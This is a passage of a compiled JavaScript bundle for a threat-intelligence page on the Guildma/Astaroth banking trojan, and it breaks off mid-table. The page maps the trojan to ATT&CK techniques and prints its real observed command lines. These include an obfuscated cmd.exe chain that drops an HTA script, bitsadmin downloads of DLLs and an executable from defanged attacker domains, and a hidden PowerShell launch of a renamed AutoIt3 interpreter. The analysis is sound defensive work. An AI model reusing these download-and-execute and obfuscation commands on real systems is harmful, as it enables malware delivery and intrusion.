"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[2082],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},8682:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return s},contentTitle:function(){return d},metadata:function(){return m},toc:function(){return u},default:function(){return c}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],s={},d=void 0,m={unversionedId:"Sightings/Guildma_RAT",id:"Sightings/Guildma_RAT",isDocsHomePage:!1,title:"Guildma_RAT",description:"Overview",source:"@site/docs/03-Sightings/07-Guildma_RAT.md",sourceDirName:"03-Sightings",slug:"/Sightings/Guildma_RAT",permalink:"/ac3-threat-sightings/docs/Sightings/Guildma_RAT",tags:[],version:"current",sidebarPosition:7,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Raccoon_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer"},next:{title:"TA551-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/TA551-Phishing"}},u=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.",id:"threat-actor-used-malicious-zip-file-to-lure-users-for-initial-access",children:[]},{value:"Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.",id:"threat-actor-used-malicious-lnk-file-to-lure-users-for-execution",children:[]},{value:"Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.",id:"threat-actor-used-cmd-to-run-obfuscated-command-that-drops-hta-file-for-defense-evasion",children:[]},{value:"Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.",id:"threat-actor-used-powershell-to-execute-hta-payload-via-mshta-for-defense-evasion",children:[]},{value:"Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.",id:"threat-actor-used-mshta-to-orchestrate-the-download-of-guildma-dll-and-other-artifacts-via-bitsadmin-for-command-and-control",children:[]},{value:"Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.",id:"threat-actor-used-mshta-to-launch-a-powershell-command-that-loads-guildma-dll-for-defense-evasion",children:[]},{value:"Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.",id:"threat-actor-used-powershell-to-launch-autoit3-script-for-defense-evasion",children:[]},{value:"Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.",id:"threat-actor-used-a-renamed-copy-of-autoit3-interpreter-to-run-malicious-autoit3-scripts-to-launch-guildma-dll-for-execution",children:[]},{value:"Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.",id:"threat-actor-used-autoit3-scripts-to-launch-guildma-dll-for-execution",children:[]}]}],p={toc:u};function c(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"Guildma (a.k.a Astaroth) is a banking trojan observed mostly on LATAM, Spain and Portugal. The main focus of the actor is the financial sector. In this Threat Sighting Guildma was downloaded using a complex chain of PowerShell, CMD, MSHTA, BITSadmin and loaded into memory via a malicious AutoIt3 script."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Guildma_RAT.yml")),(0,l.kt)("p",null,"Author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)"),(0,l.kt)("p",null,"Acknowledgements: Kimberly - @StopMalvertisin"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://app.any.run/tasks/902b68a6-4069-4a8f-bd10-3f3b198ff0c5/#"},"https://app.any.run/tasks/902b68a6-4069-4a8f-bd10-3f3b198ff0c5/#")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://twitter.com/StopMalvertisin/status/1448876652507717635"},"https://twitter.com/StopMalvertisin/status/1448876652507717635")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://attack.mitre.org/software/S0373"},"https://attack.mitre.org/software/S0373"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"li"},"ZIP")," file to lure users for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"li"},".LNK")," file to lure users for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"li"},"HTA")," file for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to execute ",(0,l.kt)("em",{parentName:"li"},"HTA")," payload via ",(0,l.kt)("em",{parentName:"li"},"MSHTA")," for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"li"},"BITSadmin")," for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," command that loads Guildma DLL for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to launch ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," script for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used a renamed copy of ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," interpreter to run malicious ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," scripts to launch Guildma DLL for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"li"},"Guildma DLL")," for Execution.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"++++ (4)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nEXE[Execution] --\x3e | malicious _ZIP_ file to lure users| IA[Initial Access]\nIA[Initial Access] --\x3e | malicious _.LNK_ file to lure users| EXE[Execution]\nEXE[Execution] --\x3e | _CMD_ to run obfuscated command that drops _HTA_ file| DE[Defense Evasion]\nEXE[Execution] --\x3e | _PowerShell_ to execute _HTA_ payload via _MSHTA_| DE[Defense Evasion]\nEXE[Execution] --\x3e | _MSHTA_ to orchestrate the download of Guildma DLL and other artifacts via _BITSadmin_| C2[Command And Control]\nEXE[Execution] --\x3e | _MSHTA_ to launch a _PowerShell_ command that loads Guildma DLL| DE[Defense Evasion]\nEXE[Execution] --\x3e | _PowerShell_ to launch _AutoIt3_ script| DE[Defense Evasion]\nEXE[Execution] --\x3e | a renamed copy of _AutoIt3_ interpreter to run malicious _AutoIt3_ scripts to launch Guildma DLL| EXE[Execution]\nEXE[Execution] --\x3e | _AutoIt3_ scripts to launch _Guildma DLL_| EXE[Execution]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},"ZIP")," file to lure users for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".LNK")," file to lure users for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1218.005 - Signed Binary Proxy Execution: Mshta"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to execute ",(0,l.kt)("em",{parentName:"td"},"HTA")," payload via ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer",(0,l.kt)("br",null),"T1218.005 - Signed Binary Proxy Execution: Mshta",(0,l.kt)("br",null),"T1197 - BITS Jobs",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," command that loads Guildma DLL for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to launch ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," script for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059 - Command and Scripting Interpreter",(0,l.kt)("br",null),"T1036 - Masquerading"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a renamed copy of ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," interpreter to run malicious ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch Guildma DLL for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059 - Command and Scripting Interpreter",(0,l.kt)("br",null),"T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"td"},"Guildma DLL")," for Execution.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},"ZIP")," file to lure users for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe" "C:\\\\Users\\\\#{user}\\\\Desktop\\\\TUP32980638916Y.zip"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\359168.783.30258.81261_857.62608.08524.zip"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139..zip"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139.LNK"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon-dll-decoded.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.log"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1_.au3"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\log32.dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\r1.log")),(0,l.kt)("td",{parentName:"tr",align:null},"- AutoIt3 script interpreter in masqueraded as 'ctfmon.exe'",(0,l.kt)("br",null),"- The LNK file is the first-stage payload")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".LNK")," file to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139.LNK"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /V/D/c \\\"seT sKk=script&&seT px=powershell&&SEt NEGG=C:\\\\Users\\\\Public\\\\Videos\\\\^YqW&&SEt SMO=.H&&SEt XQGZ=^<!sKk!^>try{v6POar c=\\'!sKk!:\\';d=\\'h6POTtP:\\';G6POetObj6POect(c+d+\\'&&sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\\');}catch(e){}close();^</!sKk!^>&&sEt/^p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\"<nul > %NEGG%%SMO%ta\\|!px! -Command \\\"& \\'!NEGG!!SMO!ta\\' \\\"")),(0,l.kt)("td",{parentName:"tr",align:null},"- The command line establishes different variables (sKk, px, NEGG, SMO, XQGZ, FIC, YE8N) to execute a command")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to run obfuscated command that drops ",(0,l.kt)("em",{parentName:"td"},"HTA")," file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\Windows\\system32\\cmd.exe  /S /D /c\\" sEt/p YE8N=\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\" 0<nul 1>%NEGG%%SMO%ta\\"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta")),(0,l.kt)("td",{parentName:"tr",align:null},"- This process creates a file in the path Videos of the user Public of the system.",(0,l.kt)("br",null),"- This file includes the URL where the malware will connect to download next stages payloads.",(0,l.kt)("br",null),"- An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1218.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to execute ",(0,l.kt)("em",{parentName:"td"},"HTA")," payload via ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell  -Command \"& 'C:\\Users\\Public\\Videos\\YqW.Hta' "),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\mshta.exe" "C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta"')),(0,l.kt)("td",{parentName:"tr",align:null},"- This execution triggers different events in the system like Network and File events.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105",(0,l.kt)("br",null),"T1218.005",(0,l.kt)("br",null),"T1197",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to orchestrate the download of Guildma DLL and other artifacts via ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"104.21.76[.]96"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"http://waa8.nolii[.]date/?1/"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\bitsadmin.exe" /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.dll"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\HE6VS7YU.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\XJHKVD2B.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\3JVKRLFN.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Temporary Internet Files\\\\Content.IE5\\\\BDW1XBVN\\\\0KG1IQBM.htm"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log32.dll"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 "C:\\Users\\Public\\Videos\\VEO46570203888O\\log33.dll"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\bitsadmin.exe" /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 "C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /V /C "echo C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\>C:\\\\Users\\\\Public\\\\lu"&& exit'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\lu")),(0,l.kt)("td",{parentName:"tr",align:null},"- The cookie 'cidade' is established in the first response of the C2. The value will be different for each intrusion. One of the observed is the following -> 'set-cookie: cidade=CFXX;'",(0,l.kt)("br",null),"- The content of the file is 'C:","\\","Users","\\","Public","\\","Videos","\\","VEO46570203888O","\\","'",(0,l.kt)("br",null),"- The content of the files saved in the Cookies path, is related to the values of the cookie in each response of the C2 (country, domain, etc.)",(0,l.kt)("br",null),"- The .htm file is the content of the server when the request was made by the mstha process.",(0,l.kt)("br",null),"- When mstha.exe is executed, a copy of the website visited is saved in the system with .htm extension.",(0,l.kt)("br",null),"- 4 different process of bitsadmin are spawned by mshta.",(0,l.kt)("br",null),"- Dumps the content of the echo parameter into the file called 'lu'",(0,l.kt)("br",null),"- The content of the file is 'C:","\\","Users","\\","Public","\\","Videos","\\","VEO46570203888O","\\","'")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSHTA")," to launch a ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," command that loads Guildma DLL for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\cmd.exe" /c cd C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\&& ^start ^/W ^/MIN powershell -windowstyle hidden -Command "& "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe" C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log "&& timeout 3600')),(0,l.kt)("td",{parentName:"tr",align:null},"- This CMD.exe is executed at the same time of bitsadmin.exe. Both are child process of mshta (possibly ADS)",(0,l.kt)("br",null),"- Alternate Data Stream (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to launch ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," script for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process 